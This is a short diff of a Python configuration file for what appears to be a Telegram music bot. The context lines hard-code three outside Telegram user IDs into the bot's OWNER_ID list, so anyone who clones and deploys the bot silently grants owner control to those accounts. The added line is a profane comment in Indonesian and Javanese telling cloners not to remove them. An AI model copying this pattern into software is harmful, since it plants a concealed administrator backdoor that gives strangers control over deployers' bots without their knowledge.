@@ -46,6 +46,8 @@ MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME")
 OWNER_ID = list(
     map(int, getenv("OWNER_ID", "").split())
 )  # Input type must be interger
+
+# JANGAN HAPUS YA JANCOK KALO NECLONE
 OWNER_ID.append(1708335413)
 OWNER_ID.append(962922529)
 OWNER_ID.append(1767314530)
